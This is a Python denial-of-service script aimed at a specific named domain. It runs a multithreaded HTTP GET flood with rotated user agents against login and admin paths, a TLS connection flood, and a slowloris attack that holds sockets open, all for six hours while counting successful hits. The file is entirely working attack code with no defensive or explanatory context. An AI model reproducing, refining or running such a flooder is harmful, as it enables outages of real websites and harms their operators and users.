import requests, threading, time, random, socket, ssl
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings()

TARGET = "https://ryhar.my.id"
HOST = "ryhar.my.id"
THREADS = 500
DURATION = 21600

success = 0
failed = 0
lock = threading.Lock()

ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
]

paths = ["/", "/wp-admin", "/wp-login.php", "/xmlrpc.php", "/wp-json", "/admin", "/login", "/api", "/search", "/feed"]

def http_flood():
    global success, failed
    sess = requests.Session()
    while time.time() < end_time:
        try:
            headers = {
                "User-Agent": random.choice(ua),
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
            }
            sess.get(TARGET + random.choice(paths), headers=headers, timeout=3, verify=False)
            with lock: success += 1
        except:
            with lock: failed += 1

def tcp_flood():
    global success
    while time.time() < end_time:
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((HOST, 443))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=HOST)
            s.send(f"GET / HTTP/1.1\r\nHost: {HOST}\r\nUser-Agent: {random.choice(ua)}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.close()
            with lock: success += 1
        except:
            pass

def slowloris():
    sockets = []
    for _ in range(200):
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((HOST, 443))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=HOST)
            s.send(f"GET / HTTP/1.1\r\nHost: {HOST}\r\nUser-Agent: {random.choice(ua)}\r\nConnection: keep-alive\r\n".encode())
            sockets.append(s)
        except:
            pass
    while time.time() < end_time:
        for s in list(sockets):
            try:
                s.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
            except:
                sockets.remove(s)
        time.sleep(random.uniform(2, 5))

end_time = time.time() + DURATION

print(f"TARGET: {TARGET} | THREADS: {THREADS} x 100 jobs | DURATION: {DURATION}s (6h)\n")

with ThreadPoolExecutor(max_workers=THREADS) as executor:
    for _ in range(THREADS):
        executor.submit(http_flood)

for _ in range(200):
    threading.Thread(target=tcp_flood, daemon=True).start()

threading.Thread(target=slowloris, daemon=True).start()

while time.time() < end_time:
    remaining = int(end_time - time.time())
    h = remaining // 3600
    m = (remaining % 3600) // 60
    s = remaining % 60
    print(f"OK:{success} | Fail:{failed} | {h}h {m}m {s}s", end="\r")
    time.sleep(1)

print(f"\nDONE | Success: {success} | Failed: {failed}")
